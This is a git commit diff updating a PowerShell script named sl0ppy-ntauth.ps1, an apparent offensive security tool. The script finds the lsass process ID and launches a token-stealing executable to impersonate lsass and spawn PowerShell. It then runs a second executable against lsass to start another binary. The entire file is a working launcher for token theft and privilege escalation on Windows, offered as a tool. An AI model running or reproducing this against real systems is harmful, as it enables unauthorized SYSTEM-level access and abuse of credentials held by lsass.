f8bc3a0621ba8653985e66212df9d1f5d5073f94
Patrick x0xr00t Hoogeveen <25748471+x0xr00t@users.noreply.github.com>
2023-09-09 00:55:58 +0200

    Update sl0ppy-ntauth.ps1

--- sl0ppy-ntauth.ps1
+++ sl0ppy-ntauth.ps1
@@ -1,22 +1,61 @@
-#!-.ps1 
-#
-# Author : P.Hoogeveem
-# Aka    : x0xr00t
-# Build  : -
-# Name   : Sl0ppy-ntauth
+<#
+.SYNOPSIS
+This script performs Lsass Impersonation using sl0ppy-TokenStealer and sl0ppy-ntauth.
+.DESCRIPTION
+The script first changes the current directory to the specified path. It then gets the process ID of lsass and runs sl0ppy-TokenStealer with the appropriate arguments. After a brief pause, it gets the lsass process ID again and runs sl0ppy-ntauth.
+.NOTES
+Author: P.Hoogeveem (x0xr00t)
+#>
 
+# Display banner
 Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
 Write-Host " {sl0p}Lsass Impersonation{sl0p}"
 Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
 Write-Host ""
 Write-Host ""
-cd -Path 'C:\Users\x0\Desktop\ALPI\sl0ppy-TokenStealer' -PassThru
-Write-Host ""
-Write-Host ""
-$i = get-process lsass |select -expand id 
-#./sl0ppyTI.exe pid:$i binary:C:\windows\system32\cmd.exe
-powershell ./sl0ppyTI.exe pid:$i binary:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-sleep 5 
-$i = get-process lsass |select -expand id
-powershell ./sl0ppy-ntauth.exe pid:$i binary:C:\Users\x0\Desktop\ALPI\sl0ppy-ntc.exe 
 
+# Change the current directory
+$scriptPath = 'C:\Users\x0\Desktop\ALPI\sl0ppy-TokenStealer'
+Set-Location -Path $scriptPath
+
+# Sleep function with display
+function SleepWithMessage {
+    param(
+        [int]$Seconds,
+        [string]$Message
+    )
+
+    Write-Host $Message
+    Start-Sleep -Seconds $Seconds
+}
+
+# Get the lsass process ID
+$lsassProcess = Get-Process -Name lsass
+
+if ($lsassProcess) {
+    $lsassProcessID = $lsassProcess.Id
+
+    # Run sl0ppy-TokenStealer with appropriate arguments
+    Write-Host "Running sl0ppy-TokenStealer..."
+    Start-Process -FilePath 'powershell' -ArgumentList "./sl0ppyTI.exe pid:$lsassProcessID binary:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+
+    # Sleep for a few seconds
+    SleepWithMessage -Seconds 5 -Message "Waiting for sl0ppy-TokenStealer to finish..."
+
+    # Get the lsass process ID again
+    $lsassProcess = Get-Process -Name lsass
+
+    if ($lsassProcess) {
+        $lsassProcessID = $lsassProcess.Id
+
+        # Run sl0ppy-ntauth with appropriate arguments
+        Write-Host "Running sl0ppy-ntauth..."
+        Start-Process -FilePath 'powershell' -ArgumentList "./sl0ppy-ntauth.exe pid:$lsassProcessID binary:C:\Users\x0\Desktop\ALPI\sl0ppy-ntc.exe"
+    }
+    else {
+        Write-Host "Error: lsass process not found."
+    }
+}
+else {
+    Write-Host "Error: lsass process not found."
+}
